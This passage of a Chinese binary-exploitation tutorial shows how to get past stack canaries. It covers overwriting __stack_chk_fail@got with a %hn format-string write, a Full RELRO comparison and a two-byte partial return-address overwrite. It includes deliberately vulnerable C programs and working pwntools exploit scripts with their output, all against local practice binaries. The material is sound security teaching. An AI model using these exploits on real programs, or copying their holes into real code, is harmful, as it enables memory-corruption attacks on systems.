三个字节分别花了 223、102、131 次尝试——运气有波动（本字节的正确值落在 256 个候选的哪个位置是均匀随机的），但 ==`00 de 65 82` 这个前缀是"比对通过"直接确认的事实==：尾声比对拿栈上的 8 字节与 `fs:0x28` 的原件比，能通过就说明这 4 个字节与真哨兵逐位相同。

### 4.4 次数账与适用边界

完整跑完的代价：11.2 的 1792 次是上限，均摊约 900 次。按本节的节奏（每次连接一个来回），几分钟量级；==这条路不是首选，是兜底==——有格式化字符串走路线一（一发读全），有 read/puts 组合走路线二（两发完事），都没有才数连接。它的独特价值在"远程侧信息为零"：==不需要任何输出格式、不需要知道二进制里有 win 还是 system==，只要"崩了能重连、重连不换哨兵"就能磨出来。逐字节确认后的利用与路线二相同：带着完整 Canary 回填、溢出、按题目条件组装利用链（[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]）。

> [!info]- 爆破也能用于其他逐字节比对的场合
> "子进程继承 + 崩溃重试 + 逐字节判定"是通用思路，不只对 Canary：某些题目的自定义 magic check，只要是"fork 服务里的逐字节等值比较"，同款脚本改两个常量就能用。判断标准一条：==比对的值在连接之间是否稳定==——稳定才可逐字节试出来。

## 5. 路线四：别碰 Canary——改写 \_\_stack\_chk\_fail@got

前三条路线都在"让比对通过"上做文章。这一条换一个问题：==比对不过，代码会去哪==？

### 5.1 校验失败后的调用链

[[P04-Linux安全缓解机制#3. Stack Canary：栈上的哨兵值|P4 第 3 节]]的反汇编里，尾声比对失败走的是 `call __stack_chk_fail@plt`。PLT 的跳转链 [[P03-ELF链接与延迟绑定#2. 延迟绑定：puts 的第一次调用|P3 第 2 节]]拆过：`__stack_chk_fail@plt` 查自己的 GOT 槽位、`jmp` 过去——==查表跳转的落点在可写数据段里，而"落在哪"是可以改的==。Partial RELRO 下 GOT 函数槽仍可写（[[P03-ELF链接与延迟绑定#3. RELRO：GOT 什么时候变只读|P3 第 3 节]]），于是：

==把 `__stack_chk_fail@got` 改成 `win` 的地址，再故意砸碎哨兵——校验"失败"一次，控制流反而落进 `win`==。哨兵的值完全不需要知道，==校验失败之后的去向，已经由这一次改写安排==。

演示程序在路线一的基础上把 `printf(buf)` 的用途从"读"换成"写"（`%n`，机制 [[P09-格式化字符串漏洞#4. %n：把已输出的字符数写进内存|P9 第 4 节]]）：

```c
/* p11_got.c —— 路线四演示程序：改写 __stack_chk_fail@got，校验失败反而进 win（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

char *gets(char *s);   /* gets 已移出 C11 标准，手动补声明 */

void win(void) {
    puts("flag{chkfail_got_hijack}");
    _exit(0);            /* 直接走系统调用退出，不再回到正常收尾 */
}

void vuln(void) {
    char buf[128];
    printf("patch> ");
    gets(buf);
    printf(buf);         /* 任意写：%hn 把 __stack_chk_fail@got 低 2 字节改成 win */
    putchar('\n');
    printf("smash> ");
    gets(buf);           /* 故意砸碎 Canary：校验必失败，控制流交给被改过的 GOT */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -w -O0 -fno-pie -no-pie p11_got.c -o p11_got
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccDNr024.o: in function `vuln':
p11_got.c:(.text+0x54): warning: the `gets' function is dangerous and should not be used.
```

```bash
pwn checksec ./p11_got 2>&1 | grep -E 'RELRO|Stack:|PIE'
nm p11_got | grep -E ' T (main|vuln|win)$'
readelf -r p11_got | grep stack_chk
```

输出：

```
    RELRO:      Partial RELRO
    Stack:      Canary found
    PIE:        No PIE (0x400000)
00000000004012a1 T main
0000000000401212 T vuln
00000000004011f6 T win
000000404018  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
```

写入目标定了：JUMP_SLOT 槽位在 `0x404018`，要写进去的值是 `win` 的 `0x4011f6`。再省一步——看看槽位==现在==存的是什么：

```bash
objdump -s -j .got.plt p11_got
```

输出：

```
Contents of section .got.plt:
 403fe8 083e4000 00000000 00000000 00000000  .>@.............
 403ff8 00000000 00000000 30104000 00000000  ........0.@.....
 404008 40104000 00000000 50104000 00000000  @.@.....P.@.....
 404018 60104000 00000000 70104000 00000000  `.@.....p.@.....
 404028 80104000 00000000 90104000 00000000  ..@.......@.....
```

`0x404018` 里是 `0x0000000000401060`——==延迟绑定还没发生的占位值==（自己 `.plt` 里的存根地址，[[P03-ELF链接与延迟绑定#2.1 静态视角：一段调用、两段跳板、一张表|P3 2.1]]的表）。占位值与目标值同为 `0x0040xxxx`，==高 6 字节本来就相同，只差低 2 字节==：`0x1060` 改成 `0x11f6`，==一次 `%hn` 就够==（[[P09-格式化字符串漏洞#5.2 手算 payload|P9 5.2]]的手算方法，[[P09-格式化字符串漏洞#5.4 执行流复盘|P9 5.4]]的 note 说的"半字覆盖缩减思路"在这里兑现）。

这个"只写低 2 字节"成立还有一个前提：==`__stack_chk_fail` 此前从未被调用过==——程序正常运行永远不会校验失败，所以槽位停在未解析的占位值上。若某个槽位已被解析成 libc 地址（`0x7f…` 开头），高 6 字节就不同了，得用多次 `%hn` 写完整 8 字节。

### 5.2 exploit 与执行流复盘

```python
#!/usr/bin/env python3
# exp_chkfail.py —— 路线四：%hn 把 __stack_chk_fail@got 改成 win，再故意砸碎 Canary
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

e   = ELF('./p11_got', checksec=False)
WIN = e.symbols['win']                 # 0x4011f6
GOT = e.got['__stack_chk_fail']        # 0x404018
log.info('win = %#x   __stack_chk_fail@got = %#x' % (WIN, GOT))

lo  = WIN & 0xffff                     # 只写低 2 字节：高 6 字节本来就是 0x0040（未解析的 PLT 存根）
fmt = ('%%%dc%%8$hn' % lo).encode()    # 槽位先按 8 写，下面的 assert 核对
fmt += b'a' * ((-len(fmt)) % 8)        # 补齐到 8 的倍数，地址落在整槽上
assert 6 + len(fmt) // 8 == 8          # 地址必须恰好对准参数 8

io = process('./p11_got')
io.recvuntil(b'patch> ')
io.sendline(fmt + p64(GOT))
io.recvuntil(b'smash> ')
io.sendline(b'A' * 136 + b'B' * 8)     # 砸碎 Canary：校验必失败
success(io.recvline().decode().strip())
io.close()
```

payload 的槽位换算沿用 9.1 公式：`buf` 在 `rbp-0x90`，格式串 `%4598c%8$hn` 加 5 个 `a` 补齐共 16 字节，末尾的地址落在 buf 偏移 16 处，参数 $6 + 16/8 = 8$，与 `%8$hn` 闭合。第二轮 payload ==完全不管 Canary 是什么==：136 字节填充加 8 字节 `B`，把哨兵砸成垃圾。

```bash
python3 exp_chkfail.py
```

输出：

```
[*] win = 0x4011f6   __stack_chk_fail@got = 0x404018
[x] Starting local process './p11_got'
[+] Starting local process './p11_got': pid 3152
[+] flag{chkfail_got_hijack}
[*] Stopped process './p11_got' (pid 3152)
```

| 步 | 发生了什么 |
| ---- | ---- |
| 1 | 第一轮 `gets` 收下格式串，`printf(buf)` 执行 `%hn`——`0x404018` 的低 2 字节变成 `0x11f6`，槽位值成为 `0x00000000004011f6`，即 `win` |
| 2 | 第二轮 `gets` 收下 144 字节，哨兵被 8 个 `B` 覆盖 |
| 3 | `vuln` 尾声比对失败，`je` 不成立，`call __stack_chk_fail@plt` |
| 4 | `__stack_chk_fail@plt` 查表 `jmp [0x404018]`——落进 `win`，flag 打印，`_exit` 收场 |

==比对失败本身成了跳板==：Canary 机制一行代码都没坏，坏的是"失败之后去哪"。

### 5.3 full RELRO 下此路不通

给同一份源码加 `-Wl,-z,now` 链接成 Full RELRO 版（两档 RELRO 的差别 [[P03-ELF链接与延迟绑定#3. RELRO：GOT 什么时候变只读|P3 第 3 节]]、[[P04-Linux安全缓解机制#6. RELRO：重定位区域只读|P4 第 6 节]]），同一发 payload 打过去：

```bash
gcc -w -O0 -fno-pie -no-pie -Wl,-z,now p11_got.c -o p11_got_full
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccVaJ8P1.o: in function `vuln':
p11_got.c:(.text+0x54): warning: the `gets' function is dangerous and should not be used.
```

```bash
pwn checksec ./p11_got_full 2>&1 | grep -E 'RELRO|Stack:|PIE'
readelf -l p11_got_full | grep -A1 GNU_RELRO
```

输出：

```
    RELRO:      Full RELRO
    Stack:      Canary found
    PIE:        No PIE (0x400000)
  GNU_RELRO      0x0000000000002da0 0x0000000000403da0 0x0000000000403da0
                 0x0000000000000260 0x0000000000000260  R      0x1
```

变化有两处，==每一处都单独封死这条路==：

- **槽位挪进了保护区**：`.got.plt` 并入 `.got`，`__stack_chk_fail` 的槽位落在 `0x403fd0`——GNU_RELRO 保护区是 $[\texttt{0x403da0},\ \texttt{0x404000})$，把整个 GOT 罩住，启动后只读。`%hn` 往只读页写，==进程死在 printf 内部==；
- **占位值没了**：BIND_NOW 启动即全部解析，槽位里已经是 libc 的 `__stack_chk_fail` 真实地址（`0x7f…`）——就算有办法写，"高 6 字节相同、只写低 2 字节"的缩减也不成立。

```python
#!/usr/bin/env python3
# exp_fullrelro.py —— 同一份写 payload 打 full RELRO 版：写只读页，死在 printf 里
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

e   = ELF('./p11_got_full', checksec=False)
WIN = e.symbols['win']
GOT = e.got['__stack_chk_fail']
print('win =', hex(WIN), ' __stack_chk_fail@got =', hex(GOT))

lo  = WIN & 0xffff
fmt = ('%%%dc%%8$hn' % lo).encode()
fmt += b'a' * ((-len(fmt)) % 8)

io = process('./p11_got_full')
io.recvuntil(b'patch> ')
io.sendline(fmt + p64(GOT))
io.recvall(timeout=3)            # 输出只有 4598 个填充空格，略去
print('exit code =', io.poll(True))
```

输出：

```
win = 0x4011f6  __stack_chk_fail@got = 0x403fd0
exit code = -11
```

退出码 −11 是 pwntools 对"进程死于 11 号信号"的表示——SIGSEGV，与 [[P09-格式化字符串漏洞#7.3 full RELRO：写只读页，死在 printf 里|P9 7.3]]是同一个死法。==full RELRO 题的"别碰 Canary"要换可写目标==：栈上的返回地址（配合路线一的泄露回填）、`.data`/`.bss` 里的函数指针、exit 的回调结构，按题选（[[P09-格式化字符串漏洞#7.3 full RELRO：写只读页，死在 printf 里|P9 7.3]]列过清单）。

### 5.4 顺带辨析：\_\_libc\_start\_main 的槽位为什么不在清单上

讲思路时经常有人把"劫持 GOT"推广到 `__libc_start_main`——它在启动路径的最上游，看似影响最大。先把启动路径摆出来（[[P09-格式化字符串漏洞#3.3 GDB 对证：泄露值与帧内容逐一对上|P9 3.3]]与本节 2.3 的对证都在这条路径上）：

```text
; 程序启动与收尾的控制点（x86-64 Linux）
;   _start → 调 __libc_start_main → __libc_start_call_main → 调 main
;   main 的返回地址（栈上）指向 __libc_start_call_main+129 ←── 2.3 的参数 27 就是它
;   main 返回后，__libc_start_call_main 调 exit 收尾
```

"把控入口附近的返回地址"指的是两个控制点，成立条件不同：

- **main 的返回地址（栈上）**：它在 `vuln` 帧==上方==的 main 帧里，溢出足够长时够得到。但溢出路径先碾过 `vuln` 自己的哨兵，==线性溢出必须先让比对通过（路线一/二/三先落地）才有资格写到那里==；任意写原语（如 `%n`）不受此限。改它的价值在"绕开 main 后续逻辑的干扰"，适用条件是改写发生在 main 返回之前。
- **`__libc_start_main` 的 GOT 槽位**：它是 `R_X86_64_GLOB_DAT` 重定位，装在 `.got` 里（[[P03-ELF链接与延迟绑定#2.1 静态视角：一段调用、两段跳板、一张表|P3 2.1]]的 readelf 输出可见）——==partial RELRO 下启动后同样只读==（[[P04-Linux安全缓解机制#6. RELRO：重定位区域只读|P4 第 6 节]]的保护区范围盖住整个 `.got`），只有 No RELRO 才可写；而且==这次调用发生在任何 exploit 能运行之前==，脚本拿到写能力时 `_start` 早就穿过这里了。==单次执行的程序里改这个槽位没有任何效果==——它是"听着有理、落不了地"的常见念头；真正能对准的收尾控制点是上一条说的 main 返回槽，以及 exit 遍历的回调结构（glibc 对其中指针做了加密，[[P09-格式化字符串漏洞#7.3 full RELRO：写只读页，死在 printf 里|P9 7.3]]提过）。

## 6. 部分覆盖返回地址：低 2 字节改逻辑

最后一个小手法，解决的是另一个约束：==输入长度不够写满 8 字节地址，或者只想改动最小限度==。非 PIE 程序的代码固定在 0x400000 一带（[[P04-Linux安全缓解机制#5. PIE：程序本体的基址随机化|P4 第 5 节]]），==返回地址槽里的 8 字节中，高 6 字节是写死的 `40 00 00 00 00 00`==——既然不变，就不用写。read 一类"收多少写多少"的输入函数（[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]）配合，只发到目标地址的低 2 字节为止：

$$\text{改后的地址} = (\text{原地址} \mathbin{\&} \texttt{0xffffffffffff0000}) \mathbin{|} \text{新低 2 字节} \tag{11.3}$$

演示程序（无 Canary，突出手法本身）：

```c
/* p11_partial.c —— 部分覆盖返回地址演示（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{partial_ret_two_bytes}");
}

void vuln(void) {
    char buf[32];
    printf("input> ");
    read(0, buf, 96);    /* read 收多少写多少：这一轮只发 42 字节 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -w -O0 -fno-pie -no-pie -fno-stack-protector p11_partial.c -o p11_partial
nm p11_partial | grep -E ' T (main|vuln|win)$'
objdump -d -M intel p11_partial | sed -n '/<main>:/,/^$/p'
```

输出（节选）：

```asm
; x86-64 Linux / System V AMD64 ABI
00000000004011df T main
00000000004011ab T vuln
0000000000401196 T win
00000000004011df <main>:
  4011fb:	e8 ab ff ff ff       	call   4011ab <vuln>
  401200:	bf 28 20 40 00       	mov    edi,0x402028
```

三个数凑成一道题：`vuln` 返回地址槽的原值是 `0x401200`（main 里 `call vuln` 的下一条），`win` 在 `0x401196`——==两者只有低 2 字节不同==（`0x1200` 与 `0x1196`）。填充 40 字节（buf 32 + 保存的 rbp 8，反汇编量出 `buf` 在 `rbp-0x20`）后，只补 2 字节 `\x96\x11`：

```python
#!/usr/bin/env python3
# exp_partial.py —— 低 2 字节覆盖返回地址：42 字节改道 win
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

PAD = 40            # buf 32 字节 + saved rbp 8 字节（objdump 量出）
WIN = 0x401196      # nm 查到的 win 地址

io = process('./p11_partial')
io.recvuntil(b'input> ')
io.send(b'A' * PAD + p16(WIN & 0xffff))   # 只发 42 字节，返回地址高 6 字节保持原值
print(io.recvline().decode().strip())
io.close()
```

```bash
python3 exp_partial.py
```

输出：

```
[x] Starting local process './p11_partial'
[+] Starting local process './p11_partial': pid 3156
flag{partial_ret_two_bytes}
[*] Stopped process './p11_partial' (pid 3156)
```

42 字节，槽位从 `0x401200` 变成 `0x401196`，`vuln` 一返回就落进 `win`——"改逻辑"的一般形态就是把返回地址改到==同一函数群内的其他落点==：跳过某段校验、改走某个分支、够到相邻函数，全靠这个。

> [!warning] 两个边界：它不省 Canary，PIE 下低 2 字节不是全已知
> 其一，==线性溢出写到返回地址槽，必先碾过路径上的哨兵==——函数有 Canary 时这条捷径同样要先过比对（本节演示程序关了 Canary 就是为把两件事分开）；它省的是"地址不知道、字节不够多"，不省"比对通过"。其二，==PIE 程序低 12 位不变、第 12–15 位随基址变==（[[P04-Linux安全缓解机制#5. PIE：程序本体的基址随机化|P4 第 5 节]]）：低 2 字节里有 4 位未知，确定性覆盖变成 1/16 的猜测，或先泄露基址再算全值。==非 PIE 下低 2 字节覆盖是确定性编辑，PIE 下是带概率的编辑==——这是它与"低 12 位不变"常识的分界。

> [!note] 与半字覆盖同源
> 5.2 改 GOT 低 2 字节、本节改返回地址低 2 字节、[[P09-格式化字符串漏洞#5.4 执行流复盘|P9 5.4]]note 的半字缩减、PIE 的低 12 位部分覆盖——==同一思想在不同目标上的四次出现==：写入量与确定性换着取舍，值不值得省，看题目限制的到底是长度、是地址未知、还是别的。

## 7. 路线决策表

做题从 checksec 与反汇编读到的条件出发，按表选路（[[P04-Linux安全缓解机制#8. 六种编译组合：checksec 对比与攻击方向决策|P4 第 8 节]]决策表的 Canary 与 RELRO 两行在这里展开）：

| 题目给的条件 | 走哪条 | 为什么 |
| ---- | ---- | ---- |
| 有 `printf(用户输入)` 一类格式化字符串漏洞 | 路线一（第 2 节） | `%N$p` 一发读全，顺带把 libc 地址也带出来，成本最低 |
| 没有格式化字符串；溢出用 `read` 且长度可控；有 `puts(buf)`/`write` 输出 buf | 路线二（第 3 节） | 越界一字节顶掉 `\0`，两发完成泄露与回填 |
| 只有溢出，没有任何读渠道；远程崩了能重连且不换哨兵 | 路线三（第 4 节） | 穷举换泄露，约 900 次连接兜底；服务是 exec 型则放弃 |
| 有任意写（`%n` 等），RELRO 是 Partial | 路线四（第 5 节） | 不必知道 Canary，让校验失败自己跳进后门 |
| 有格式化字符串，RELRO 是 Full | 路线一变体 | 读照旧；写改栈上返回地址等可写目标（[[P09-格式化字符串漏洞#7.3 full RELRO：写只读页，死在 printf 里\|P9 7.3]]） |
| 非 PIE，输入长度受限或想最小改动 | 部分覆盖（第 6 节） | 高 6 字节不用写，42 字节改道相邻落点 |

三条使用提醒：

- ==先读汇编再对表==：表中每条路线的 PAD/槽位/偏移都要在本题的二进制上重新量（cyclic 量偏移 [[P06-栈溢出原理与ret2win#2. 算偏移的两种方法|P6 第 2 节]]，槽位换算 [[P09-格式化字符串漏洞#2.2 位置参数确认：%6$p|P9 2.2]]）；
- ==路线可叠加==：格式化字符串既能走路线一（读）也能走路线四（写），Full RELRO 时读的一手照用——按剩余约束二次选择；
- ==泄露之后的事与 Canary 无关==：回填只解决"比对通过"，之后的 ret2win/ret2libc/ROP 是 [[P06-栈溢出原理与ret2win|P6]]、[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]的主场。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 回填后仍报 `stack smashing detected` | 泄露值不对：`%p` 槽位错位（重跑 AAAA/标记定位，[[P09-格式化字符串漏洞#2.2 位置参数确认：%6$p\|P9 2.2]]）；或填充长度没随 Canary 版帧重测——哨兵在 `[rbp-0x8]`，cyclic 重量（[[P04-Linux安全缓解机制#9. 常见问题\|P4 常见问题]]） |
| `puts` 泄露只收到几个字节 | 哨兵字节里混了 `\x00`（或 `0x0a`），输出提前截断（3.2 的 assert 拦的就是它）：重跑换一个哨兵；题目有 `write` 就改用按长度输出 |
| 泄露值还原后末字节不是 `00` | 字节切错位或补零方向反了：缺低位补最前（3.2），缺高位补末尾（[[P03-ELF链接与延迟绑定#4. ret2plt：把 libc 地址打印出来\|P3 第 4 节]]）——两个方向对照记忆 |
| payload 发完直接 EOF | Canary 或地址字节撞 `0x0a` 被 gets 截断（2.4 的 warning）：重跑换值，或题目用 read 时一次 `send` 发全量 |
| 回填成功、链也通，崩在 libc 内部的 movaps | 16 字节对齐差 8：链首垫 libc 里的裸 ret（2.4 折叠框，[[P06-栈溢出原理与ret2win#5. 栈 16 字节对齐与 movaps 崩溃\|P6 第 5 节]]） |
| 爆破每字节 256 次全不中 | 靶子不是 fork 继承模型：fork 后 exec 了，每连接 Canary 换新（4.2 的 warning）；或 PAD 与反汇编不符 |
| 爆破判对判错随机漂移 | 判定信号不可靠：`bye` 一类成功信号必须放在 Canary 检查==之后==才打得出（4.2），放检查前则两种结局同输出 |
| `%hn` 写完 GOT，程序照常退出、校验失败也没反应 | 写错了槽位或值：`readelf -r` 核对 JUMP_SLOT 槽位（5.1），先发 `%8$p` 确认槽里已是目标地址 |
| full RELRO 题想走路线四 | 槽位只读且已被 BIND_NOW 解析成 libc 地址（5.3）：改走路线一/二泄露回填，或按 [[P09-格式化字符串漏洞#7.3 full RELRO：写只读页，死在 printf 里\|P9 7.3]]换可写目标 |
| 低 2 字节覆盖后跳到奇怪的地方 | 字节序或位宽错（`p16` 小端两字节），或目标与原地址高位不同（PIE 下第 12–15 位随机，第 6 节的 warning）：打印两地址全值比对 |
